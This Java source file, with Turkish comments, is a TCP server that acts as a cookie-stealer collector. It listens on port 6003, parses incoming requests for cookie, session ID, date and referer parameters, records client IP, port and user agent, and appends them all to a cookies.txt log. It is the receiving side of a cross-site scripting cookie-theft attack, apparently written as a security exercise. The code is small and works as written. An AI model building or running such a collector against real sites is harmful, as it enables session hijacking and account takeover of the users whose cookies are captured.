import java.net.*;
import java.io.*;

public class server {
    public static void main(String[] args) throws IOException {

        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(6003);
        } catch (IOException e) {
            System.err.println("I/O exception: " + e.getMessage());
            System.exit(1);
        }
        System.out.println("Sunucu baslatildi. Baglanti bekleniyor...");
        Socket clientSocket = null;
        while(true){
            try {
                clientSocket = serverSocket.accept(); // bağlantı gelene kadar
                // burada bekler
            } catch (IOException e) {
                System.err.println("Accept failed.");
                continue;
            }

            System.out.println(clientSocket.getLocalAddress() + " baglandi.");

            // input stream ve output stream yaratılıyor...
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    clientSocket.getInputStream()));

            String inputLine, outputLine;
            System.out.println("İstemciden girdi bekleniyor...");
            FileWriter cookies=new FileWriter("src/cookies.txt",true);
            int count =0;
            String clientIp="";
            String clientPort="";
            String clientOS="";
            String referrer="";
            String sessionID="";
            String cookie="";
            String date="";
            while ((inputLine = in.readLine()) != null) { // istemciden gelen string
                if(count ==0){
                    String[] splitted=inputLine.split("&");
                    cookie=splitted[1].replace("%20"," " );
                    cookie=cookie.replace("cookie=","");
                    sessionID=splitted[2].replace("sessionID=","");
                    date=splitted[3].replace("date=","");
                    date=date.replace("%20"," ");
                    referrer=splitted[4].replace("referer=","");
                    count++;
                }
                else if(count==1){
                    String[] splitted= inputLine.split(":",2);
                    clientPort=splitted[1];
                    count++;
                }
                else if(count == 5){
                    String[] splitted=inputLine.split(":",2);
                    clientOS=splitted[1];
                    count++;
                }
                else if(count==7){
                    String[] splitted= inputLine.split(":",2);
                    clientIp= splitted[1];
                    count++;
                }
                else if(count == 8){
                    break;
                }
                else{
                    count++;
                }


            }
            System.out.println("****************************************\n");
            cookies.write("****************************************\n");
            System.out.println("Client Ip Address: "+clientIp);
            cookies.write("Client Ip Address--> "+clientIp+"\n");
            System.out.println("Client Port: "+ clientPort);
            cookies.write("Client Port--> "+ clientPort+"\n");
            System.out.println("Browser Information: "+ clientOS);
            cookies.write("Browser Information--> "+ clientOS+"\n");
            System.out.println("Client Operating System: "+clientOS);
            cookies.write("Client Operating System--> "+clientOS+"\n");
            System.out.println("Referer: "+referrer);
            cookies.write("Referer--> "+referrer+"\n");
            System.out.println("Session ID: "+sessionID);
            cookies.write("Session ID--> "+sessionID+"\n");
            System.out.println("Cookie: "+cookie);
            cookies.write("Cookie--> "+cookie+"\n");
            System.out.println("Date: "+date);
            cookies.write("Date--> "+date+"\n");
            cookies.close();


            // stream ve socketleri kapat.
            out.close();
            in.close();
            clientSocket.close();

        }

    }
}